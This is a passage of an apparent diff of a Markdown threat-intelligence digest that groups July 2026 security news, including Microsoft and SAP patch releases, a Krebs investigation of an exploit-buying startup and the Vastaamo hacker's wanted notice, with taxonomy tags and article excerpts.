VMware Avi Load Balancer Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Multiple Jscrambler Packages Impacted by Supply Chain Attack RabbitMQ Vulnerability Threatens Enterprise Systems Zimbra Patches Critical Code Execution Vulnerability Organizations Warned of Exploited Joomla Extension Vulnerabilities Progress Prompts ShareFile Storage Zone Controller Shutdown Amid Security Concerns Ghost Accounts Abuse GitHub API in Mass Recon Campaign Okta Warns of Vishing Attacks Targeting Microsoft 365 Customers GigaWiper Combines Multiple Malware for System-Level Sabotage Latest News SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims Adobe Patches Critical ColdFusion Vulnerabilities 7 Severe Vulnerabilities Patched in VMware Avi Load Balancer Unpatched Claude for Chrome Flaw Lets Extensions Read Gmail, Calendar SAP Patches Critical Vulnerabilities in NetWeaver, Approuter, Commerce Cloud US, Allies Warn of Russian Cyberattacks Targeting Critical Infrastructure Routers Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Security Summit July 15, 2026 This year's summit will help organizations learn how to utilize tools, controls, and design models needed to properly secure cloud environments. Interact with leading solution providers and other end users facing similar challenges in securing a variety of cloud deployments. R
 ```
 
 #### Corroborating sources (1)
 
 - **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims
-  - Published: 2026-07-14T18:18:45+00:00
-  - Link: https://www.securityweek.com/synopsys-finds-no-evidence-of-data-breach-following-bosch-hack-claims/
-  - Summary: The D1R cybercrime group claimed to have stolen valuable data from Synopsys and Bosch, threatening to leak it unless a ransom is paid. The post Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims appeared first on SecurityWeek .
-
-### Cluster 4e6c87c16b — score 10
-
-- Title: Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record
-- Source: CyberScoop (cyber_news_breach_reporting)
-- Published: 2026-07-14T20:05:46+00:00
-- Link: https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ransomware_extortion, zero_day
-- affected_industries: government
-- affected_products: Microsoft SharePoint
-- cve_ids: CVE-2026-27690, CVE-2026-44747, CVE-2026-56155, CVE-2026-56164
-- urgency_signals: actively_exploited, zero_day
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, zero_day, active_exploitation
-- affected_industries: government
-- affected_products: Microsoft SharePoint
-- cve_ids: CVE-2026-56155, CVE-2026-56164, CVE-2026-44747, CVE-2026-27690
-- urgency_signals: actively_exploited, zero_day
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The company forewarned customers and defenders that a flood of defects would be uncovered by AI. It delivered with a striking exponential increase. The post Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record appeared first on CyberScoop .
-```
-
-#### Full body
-
-```
-Advertisement Subscribe to our daily newsletter. Subscribe Close Microsoft’s monthly Patch Tuesday security program reached an unrivaled pinnacle this month, as the vendor addressed 622 vulnerabilities across its suite of business products and systems. “The bug apocalypse has finally descended upon us,” Dustin Childs, head of threat awareness at Trend Micro’s Zero Day Initiative, wrote in a blog post Tuesday. “The mother of all releases. To call this record-breaking is an understatement,” he added. “The CVE count year-to-date exceeds all other years’ totals.” The startling increase in vulnerabilities reflects a compounding effect taking root across software as artificial intelligence plays a growing role in discovering and developing patches for defects lurking in error-riddled applications. Advertisement Microsoft’s June Patch Tuesday update broke the previous all-time record with 206 vulnerabilities. The company last week warned forewarned customers and defenders that a flood of defects would be uncovered as it applies its multi-model agentic scanning harness (MDASH) to discover and address vulnerabilities at greater speed and scale. The monthly exponential rise in Microsoft vulnerabilities already puts the vendor on pace to break a full-year record, ending 2026 with the largest annual collection of defects, beating the previous record of 1,245 CVEs in 2020, Satnam Narang, senior staff research engineer at Tenable, said in an email. “It’s probable that we will not only exceed 2,000 CVEs in a calendar year, but potentially over 3,000 CVEs this year or more,” he added. “The volume is striking, but it reflects how good these tools have become at finding bugs, not how many of those bugs actually pose a risk to organizations,” Narang said. Advertisement Microsoft disclosed two actively exploited zero-day vulnerabilities — CVE-2026-56155 and CVE-2026-56164 , privilege escalation defects in Active Directory Federation Services and Microsoft SharePoint Server, respectively. The monthly batch of patches included 416 defects in Windows, 82 in Office and 46 in Microsoft Edge. More than 1 in 10 vulnerabilities the vendor disclosed — 63 total — were rated as critical. “The products covered this month are also astonishing,” Childs said. “Just about everything you’ve ever heard of is getting patched.” The full list of vulnerabilities addressed this month is available in Microsoft’s Security Response Center . SAP also addressed a fresh assortment of vulnerabilities Tuesday, including critical defects CVE-2026-44747 in SAP NetWeaver Application Server and CVE-2026-27690 in SAP Approuter. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops (Jeenah Moon/Getty Images) (Getty Images) Cisco logo sits illuminated at MWC Barcelona on February 28, 2022. (David Ramos/Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government Officials once again warn defenders that Russian hackers are targeting network devices CISA looks to remedy ailments from big May credential leak French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Technology Deepfake CSAM lawsuit against xAI, Grok expands US lifting export control restrictions on Anthropic’s Mythos, Fable Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs Threats Armenian national pleads guilty to Ryuk ransomware attacks Former DigitalMint ransomware negotiator who duped clients sentenced to 70 months in jail Interpol cybercrime crackdown nets 5,800 arrests across 97 countries 764 splinter group leader sentenced to 40 years
-```
-
-#### Corroborating sources (1)
-
-- **CyberScoop** (cyber_news_breach_reporting)
-  - Title: Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record
-  - Published: 2026-07-14T20:05:46+00:00
-  - Link: https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
-  - Summary: The company forewarned customers and defenders that a flood of defects would be uncovered by AI. It delivered with a striking exponential increase. The post Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record appeared first on CyberScoop .
+  - Title: Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates
+  - Published: 2026-07-15T07:24:52+00:00
+  - Link: https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
+  - Summary: Public exploit code targeting the Firefox flaws exists, but no in-the-wild exploitation has been observed. The post Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates appeared first on SecurityWeek .
 
 ### Cluster b47b034408 — score 10
 
@@ -2602,6 +2466,100 @@ Duncan Wilcock • July 14, 2026 11:27 PM Reminds me of V for Vendetta, when the
   - Published: 2026-07-14T11:06:51+00:00
   - Link: https://www.schneier.com/blog/archives/2026/07/vulnerability-in-fifas-network.html
   - Summary: FIFA’s network was vulnerable to anyone with even minimal access.
+
+### Cluster ce7170bd38 — score 10
+
+- Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
+- Source: Krebs on Security (practitioner_analysis)
+- Published: 2026-07-08T12:31:39+00:00
+- Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- affected_industries: education, government, telecommunications
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- affected_industries: government, telecommunications, education
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Summary
+
+```
+A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
+```
+
+#### Full body
+
+```
+A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names. The X/Twitter account IRIS C2 (@C2IRIS) has gained more than 4,000 followers since its creation in January 2025, posting frequently about security vulnerabilities, AI and software exploits. IRIS C2 says it is a company in McLean, Va. that sells offensive cybersecurity capabilities. The IRIS C2 website dangles the possibility of million-dollar payouts for exploits to attract talent. “Our business model is this,” reads a pinned post on top of the IRIS C2 account on X. “Attract the very best vulnerability researchers and exploit developers in the world to join our company. This mostly revolves around junior engineers with raw talent/extremely high IQ. We don’t care if they have a college degree/industry experience.” The website linked in that profile — irisc2[.]com — says the company is hiring for a number of open positions, and a recent post on its LinkedIn page enthuses about an overwhelming number of applications from potential employees. The website claims IRIS C2 is in the business of acquiring “zero-day exploits, individual primitives, partial chains, and full capabilities across all major platforms. Payouts range from $10,000 to $7 million depending on target, reliability, and operational value.” The government contracting portal g2exchange.com reports that irisc2[.]com is operated by a business based in Virginia called Calvexa Group LLC . The “contact” link on the website for Calvexa Group — calvexagroup[.]com — forwards visitors to irisc2[.]com. G2Exchange shows that while Calvexa Group LLC is registered as a federal contractor, it does not appear to be working on any direct government contracts. A search on the Arlington, Va. address listed in the incorporation records for Calvexa Group LLC finds the property is occupied by Jack Burkman , the 60-year-old founder and managing partner of the lobbying firm Burkman & Associates . When approached with questions about IRIS C2, Burkman referred further inquiries to his longtime associate, 28-year-old Jacob Wohl . Jack Burkman (left) and Jacob Wohl, at a press conference in August 2020. Image: Wikipedia. Burkman and Wohl have a storied history of creating fake intelligence companies and using them to spread false claims about and frame public figures, including fabricated sexual assault claims against then FBI director Robert Mueller , and Pete Buttigieg , then mayor of South Bend, Indiana and a Democratic candidate for the presidency. In 2019, Burkman and Wohl held press conferences falsely alleging extramarital affairs by Sen. Elizabeth Warren (D-Mass.) and then-2020 presidential candidate Kamala Harris . In the wake of the 2020 presidential election, Wohl and Burkman were prosecuted by multiple U.S. states for making thousands of robocalls to residents of battleground states and disseminating false claims about mail-in ballots. They were indicted in Cleveland on 15 felony counts of orchestrating a robocall scheme aimed at suppressing the black vote in Detroit, and were sentenced in late 2025 to probation after their appeals to dismiss the charges were rejected. In 2022, Wohl and Burkman both pleaded guilty to a single felony charge of telecommunications fraud in Ohio, and sentenced to a fine, probation, and community service. In March 2023, a judge in a New York civil case ruled that Wohl and Burkman had violated federal and state civil rights laws, and the two agreed to pay a $1 million settlement. In June 2023, the Federal Communications Commission (FCC) imposed a $5.1 million fine against Wohl and Burkman for their robocall campaigns, at the time the largest fine ever sought by the FCC under the Telephone Consumer Protection Act. Jacob “Jay” Wo
+```
+
+#### Corroborating sources (1)
+
+- **Krebs on Security** (practitioner_analysis)
+  - Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
+  - Published: 2026-07-08T12:31:39+00:00
+  - Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
+  - Summary: A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
+
+### Cluster ae25d6203b — score 10
+
+- Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-14T18:17:57+00:00
+- Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-44747
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, ddos
+- actor_attribution: Scattered Spider
+- affected_industries: financial_services
+- cve_ids: CVE-2026-27690, CVE-2026-44747, CVE-2026-44761
+- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ddos, active_exploitation
+- actor_attribution: Scattered Spider
+- affected_industries: financial_services
+- cve_ids: CVE-2026-44747, CVE-2026-27690, CVE-2026-44761
+- urgency_signals: actively_exploited, preauth_unauth, critical_cvss
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
+```
+
+#### Full body
+
+```
+SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data  Ravie Lakshmanan  Jul 14, 2026 Enterprise Security / Vulnerability SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could lead to unauthorized data access, modification, or system unavailability. "As a temporary workaround the note proposes to disable all ICF nodes with a specific property in transaction SICF," SAP security firm Onapsis said . "Since the workaround will disable opening transactions in SAP GUI for HTML, it is not an option for all customers and it is strongly recommended to install the patching ABAP Kernel version." Also addressed by SAP are two other critical vulnerabilities - CVE-2026-27690 (CVSS score: 9.1) - An HTTP request/response smuggling flaw in SAP Approuter deployments in non-Cloud Foundry environments that allows an unauthenticated attacker to send a specially crafted HTTP request that leads to request-response desynchronization and results in the exposure of user responses and triggers denial-of-service (DoS) attacks. CVE-2026-44761 (CVSS score: 9.1) - A use of default credentials flaw in SAP Commerce Cloud that could retain a sample OAuth 2.0 client with publicly documented sample credentials originating from a sample configuration provided in SAP Help Portal documentation. "If left unchanged, an unauthenticated attacker could use these well-known credentials to obtain a valid access token and invoke certain APIs to read and modify data," according to a description of CVE-2026-44761 in the NIST National Vulnerability Database (NVD). "Successful exploitation results in high impact on confidentiality and integrity, with no impact on availability." Onapsis noted that the vulnerability stems from sample configuration scripts previously provided in the SAP Help Portal. These scripts, originally meant for development and testing, configure OAuth 2.0 clients with hard-coded, well-known credentials. "Older versions of the documentation did not explicitly warn customers against importing these default settings into production," it noted. "An unauthenticated attacker can leverage these publicly available, default credentials to obtain a valid access token. With this token, they can invoke specific APIs to read and alter system data. Exploitation requires that the customer executed the sample script and retained the resulting OAuth 2.0 client in production without replacing the hard-coded secret." It's worth noting that customers who removed the sample client or replaced the secret with a strong, unique value are not impacted by the bug. Customers are recommended to audit their production environments for the presence of the affected sample OAuth 2.0 client. If the client exists, it must be removed. Although there is no evidence of the flaws being exploited in the wild, it's advised to apply the necessary updates for optimal protection. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  API Security , Application Security , Authentication Security , Cloud security , data security , denial of service , enterprise security , SAP , Vulnerability , Web Security ⚡ Top Stories This Week 16-Year-Old Linux KVM Flaw Lets Guest VMs Escape to Host on Intel and AMD x86 Systems BeyondTrust Patches Critical Auth Bypass Flaws in Remote Support and PRA Court Filing Reveals Windows Device ID Helped FBI Trace Alleged Scattered Spider Hacker Rogue Agent Flaw Could Have Let Attackers Hijack Google Dialogflow CX Chatbots RedWing MaaS Packages Android Bank Fraud as a Telegram Rental Service 15-Year-O
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
+  - Published: 2026-07-14T18:17:57+00:00
+  - Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
+  - Summary: SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
 
 ### Cluster aa4a893323 — score 10
 
@@ -2649,51 +2607,6 @@ Unpatched XRING Flaw in XQUIC Lets Remote Clients Crash HTTP/3 Servers  Swati
   - Published: 2026-07-10T11:47:43+00:00
   - Link: https://thehackernews.com/2026/07/unpatched-xring-flaw-in-xquic-lets.html
   - Summary: A single wrong variable on one line in XQUIC, Alibaba's QUIC and HTTP/3 library, lets any remote client crash the server with a short burst of completely legal traffic. There is no patch. FoxIO researcher Sébastien Féry disclosed the flaw on July 8 and nicknamed it XRING. He says it needs no login and no malformed packets: about 260 bytes of ordinary QPACK traffic takes the server
-
-### Cluster ce7170bd38 — score 10
-
-- Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
-- Source: Krebs on Security (practitioner_analysis)
-- Published: 2026-07-08T12:31:39+00:00
-- Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: education, government, telecommunications
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: government, telecommunications, education
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
-```
-
-#### Full body
-
-```
-A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names. The X/Twitter account IRIS C2 (@C2IRIS) has gained more than 4,000 followers since its creation in January 2025, posting frequently about security vulnerabilities, AI and software exploits. IRIS C2 says it is a company in McLean, Va. that sells offensive cybersecurity capabilities. The IRIS C2 website dangles the possibility of million-dollar payouts for exploits to attract talent. “Our business model is this,” reads a pinned post on top of the IRIS C2 account on X. “Attract the very best vulnerability researchers and exploit developers in the world to join our company. This mostly revolves around junior engineers with raw talent/extremely high IQ. We don’t care if they have a college degree/industry experience.” The website linked in that profile — irisc2[.]com — says the company is hiring for a number of open positions, and a recent post on its LinkedIn page enthuses about an overwhelming number of applications from potential employees. The website claims IRIS C2 is in the business of acquiring “zero-day exploits, individual primitives, partial chains, and full capabilities across all major platforms. Payouts range from $10,000 to $7 million depending on target, reliability, and operational value.” The government contracting portal g2exchange.com reports that irisc2[.]com is operated by a business based in Virginia called Calvexa Group LLC . The “contact” link on the website for Calvexa Group — calvexagroup[.]com — forwards visitors to irisc2[.]com. G2Exchange shows that while Calvexa Group LLC is registered as a federal contractor, it does not appear to be working on any direct government contracts. A search on the Arlington, Va. address listed in the incorporation records for Calvexa Group LLC finds the property is occupied by Jack Burkman , the 60-year-old founder and managing partner of the lobbying firm Burkman & Associates . When approached with questions about IRIS C2, Burkman referred further inquiries to his longtime associate, 28-year-old Jacob Wohl . Jack Burkman (left) and Jacob Wohl, at a press conference in August 2020. Image: Wikipedia. Burkman and Wohl have a storied history of creating fake intelligence companies and using them to spread false claims about and frame public figures, including fabricated sexual assault claims against then FBI director Robert Mueller , and Pete Buttigieg , then mayor of South Bend, Indiana and a Democratic candidate for the presidency. In 2019, Burkman and Wohl held press conferences falsely alleging extramarital affairs by Sen. Elizabeth Warren (D-Mass.) and then-2020 presidential candidate Kamala Harris . In the wake of the 2020 presidential election, Wohl and Burkman were prosecuted by multiple U.S. states for making thousands of robocalls to residents of battleground states and disseminating false claims about mail-in ballots. They were indicted in Cleveland on 15 felony counts of orchestrating a robocall scheme aimed at suppressing the black vote in Detroit, and were sentenced in late 2025 to probation after their appeals to dismiss the charges were rejected. In 2022, Wohl and Burkman both pleaded guilty to a single felony charge of telecommunications fraud in Ohio, and sentenced to a fine, probation, and community service. In March 2023, a judge in a New York civil case ruled that Wohl and Burkman had violated federal and state civil rights laws, and the two agreed to pay a $1 million settlement. In June 2023, the Federal Communications Commission (FCC) imposed a $5.1 million fine against Wohl and Burkman for their robocall campaigns, at the time the largest fine ever sought by the FCC under the Telephone Consumer Protection Act. Jacob “Jay” Wo
-```
-
-#### Corroborating sources (1)
-
-- **Krebs on Security** (practitioner_analysis)
-  - Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
-  - Published: 2026-07-08T12:31:39+00:00
-  - Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
-  - Summary: A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
 
 ### Cluster 98dd5f4721 — score 10
 
@@ -2890,132 +2803,52 @@ Anyone who deals with phishing messages caught by basic security filters knows t
   - Link: https://isc.sans.edu/diary/rss/33144
   - Summary: Anyone who deals with phishing messages caught by basic security filters knows that most phishing samples tend to blend into one another, since only a small set of techniques and approaches keeps reappearing in them. That is precisely why it is worth pausing on the occasional message that does something a little out of the ordinary.
 
-### Cluster d1c5b97119 — score 9
+### Cluster 3be6f6fab7 — score 9
 
-- Title: OWASP API Security Top 10 (2023): A Cloud-Native Guide for Security Teams
-- Source: Orca Security Research (cloud_identity_infrastructure)
-- Published: 2026-07-14T17:50:09+00:00
-- Link: https://orca.security/resources/blog/owasp-api-security-top-10/
+- Title: Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-07-14T18:01:36+00:00
+- Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: data_breach
+- threat_categories: active_exploitation, ddos, zero_day
+- affected_products: Microsoft BitLocker, Microsoft SharePoint, Microsoft Windows
+- cve_ids: CVE-2026-50661, CVE-2026-56155, CVE-2026-56164
+- urgency_signals: actively_exploited, zero_day
 - content_type: news_report
-- confidence_tier: tier_2_operator
+- confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: data_breach
+- threat_categories: zero_day, ddos, active_exploitation
+- affected_products: Microsoft BitLocker, Microsoft SharePoint, Microsoft Windows
+- cve_ids: CVE-2026-56155, CVE-2026-56164, CVE-2026-50661
+- urgency_signals: actively_exploited, zero_day
 - content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-The Open Web Application Security Project (OWASP) API Security Top 10 focuses on understanding and mitigating vulnerabilities and security risks of APIs.
-```
-
-#### Full body
-
-```
-Table of contents Key Takeaways What Is the OWASP API Security Top 10? OWASP API Security Top 10 vs. the OWASP Top 10 (web apps) Why API Security Risks Are Escalating in the Cloud The OWASP API Security Top 10 (2023 Edition) API1:2023: Broken Object Level Authorization (BOLA) API2:2023: Broken Authentication API3:2023: Broken Object Property Level Authorization (BOPLA) API4:2023: Unrestricted Resource Consumption API5:2023: Broken Function Level Authorization (BFLA) API6:2023: Unrestricted Access to Sensitive Business Flows API7:2023: Server-Side Request Forgery (SSRF) API8:2023: Security Misconfiguration API9:2023: Improper Inventory Management API10:2023: Unsafe Consumption of APIs What Changed from the 2019 to the 2023 OWASP API Security Top 10 How to Prevent OWASP API Security Risks: Best Practices Discover and inventory every API (shadow, zombie, deprecated) Enforce authentication & authorization (RBAC/ABAC, least privilege, MFA) Rate limiting & resource controls Shift-left API security testing in CI/CD Continuous monitoring & runtime protection (WAF/WAAP/API gateway in context) Securing APIs Across Multi-Cloud with Orca Frequently Asked Questions about OWASP API Security Key Takeaways The OWASP API Security Top 10 ranks the most critical API security risks and provides practical guidance for reducing them. Broken Object Level Authorization (BOLA) remains the number-one risk, and most of the top categories stem from authorization failures rather than vulnerabilities a firewall can detect. The current 2023 edition renamed several categories, merged Excessive Data Exposure and Mass Assignment into BOPLA, and added SSRF, Unsafe Consumption of APIs, and Unrestricted Access to Sensitive Business Flows. You cannot secure APIs you cannot see. Improper Inventory Management (API9) makes maintaining an accurate inventory of active, shadow, and deprecated APIs a foundational security practice. Orca discovers every web and API endpoint agentlessly, correlates each finding with the surrounding cloud risk, and prioritizes the APIs that create real attack paths. The OWASP API Security Top 10 is OWASP’s ranked list of the most critical security risks affecting APIs. It provides a practical framework for identifying common weaknesses, prioritizing remediation, and building more secure APIs. The current edition is the 2023 release, which supersedes the 2019 version and remains the latest guidance available. APIs now carry the traffic, business logic, and sensitive data that once sat behind web applications, and cloud-native environments create new endpoints continuously. This guide explains each OWASP API Security Top 10 category, highlights what changed in the 2023 update, and outlines practical prevention strategies for cloud and multi-cloud environments. What Is the OWASP API Security Top 10? The OWASP API Security Top 10 is a standard awareness document that ranks the ten most critical security risks to application programming interfaces (APIs). The Open Worldwide Application Security Project (OWASP) publishes it through the OWASP API Security Project, a community effort that maintains the list from real-world API breach and bug-bounty data. OWASP first published the API list in 2019 because the general OWASP Top 10 for web apps did not capture how APIs fail, and released the current 2023 edition after four years of new data. Each risk carries an identifier (API1 through API10), so teams treat the list as a testing and prioritization baseline. It names where to look first and gives AppSec and platform teams a shared vocabulary for API risk. OWASP API Security Top 10 vs. the OWASP Top 10 (web apps) The two lists overlap but solve different problems. The general OWASP Top 10 covers web application risks such as injection and broken access control. The API list targets the object, property, and function-level authorization logic that APIs expose directly to callers, plus API-specific risks like Improper Inventory Management and Unsafe Con
-```
-
-#### Corroborating sources (1)
-
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - Title: OWASP API Security Top 10 (2023): A Cloud-Native Guide for Security Teams
-  - Published: 2026-07-14T17:50:09+00:00
-  - Link: https://orca.security/resources/blog/owasp-api-security-top-10/
-  - Summary: The Open Web Application Security Project (OWASP) API Security Top 10 focuses on understanding and mitigating vulnerabilities and security risks of APIs.
-
-### Cluster 5615f720c3 — score 9
-
-- Title: Finland issues wanted notice for hacker behind massive psychotherapy data breach
-- Source: The Record (cyber_news_breach_reporting)
-- Published: 2026-07-14T17:28:00+00:00
-- Link: https://therecord.media/finland-issues-wanted-notice-for-hacker-vastaamo-breach
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion
-- affected_industries: financial_services, government
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, data_breach
-- affected_industries: financial_services, government
-- content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Summary
 
 ```
-The defendant's lawyer told Finnish media that he does not know where his client is but believes Kivimäki is outside Finland.
+Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. [...]
 ```
 
 #### Full body
 
 ```
-Finland issues wanted notice for hacker behind massive psychotherapy data breach Finnish police have reportedly issued a wanted notice for convicted hacker Aleksanteri Kivimäki after the country's Supreme Court refused to hear his appeal, paving the way for authorities to return him to prison in one of Finland's most high-profile cybercrime cases. The Supreme Court's decision leaves in place a February Court of Appeal ruling that sentenced Kivimäki to nearly seven years in prison for hacking psychotherapy provider Vastaamo and later extorting both the company and its patients, according to Finnish media . Following the ruling, Eastern Uusimaa Police said they issued the wanted notice at the request of Finland's Criminal Sanctions Agency. Officers have been instructed to arrest Kivimäki if he is located and transfer him to Vantaa Prison to serve the rest of his sentence. His lawyer, Peter Jaari, told Finnish media that he does not know where his client is but believes Kivimäki is outside Finland. The Court of Appeal convicted Kivimäki of aggravated data breach, attempted extortion and unlawfully distributing private information. The judges said the crimes were carefully planned, driven by financial gain and caused exceptional harm to a large number of especially vulnerable victims. The court said the offenses would normally have justified the maximum available sentence. However, it reduced Kivimäki's prison term by one month because he reached compensation agreements with some of the victims. Kivimäki has denied carrying out the attack throughout the case. He argued that prosecutors relied largely on circumstantial evidence, challenged the digital evidence linking him to the hack and disputed allegations involving cryptocurrency transactions tied to the extortion scheme. The appeals court released Kivimäki from pretrial detention in September 2025 after finding that he had already spent enough time in custody and that keeping him detained any longer could violate his rights. Because most of his sentence had effectively been served while he awaited trial, he remained free during the appeals process. Now that the Supreme Court has declined to hear the case, the conviction is final. Finnish authorities are trying to find Kivimäki so he can serve the remainder of his sentence. The Vastaamo breach occurred in 2018 but did not become public until 2020, when the attacker first tried to extort the company before demanding money directly from thousands of patients. When many victims refused to pay, confidential therapy notes and other highly sensitive records were published online. The stolen database contained information on about 33,000 patients, and more than 24,000 people reported receiving extortion demands. The case became the largest criminal case in Finnish history by number of victims, many of whom were children or people receiving treatment for severe psychological trauma. Cybercrime Government News Get more insights with the Recorded Future 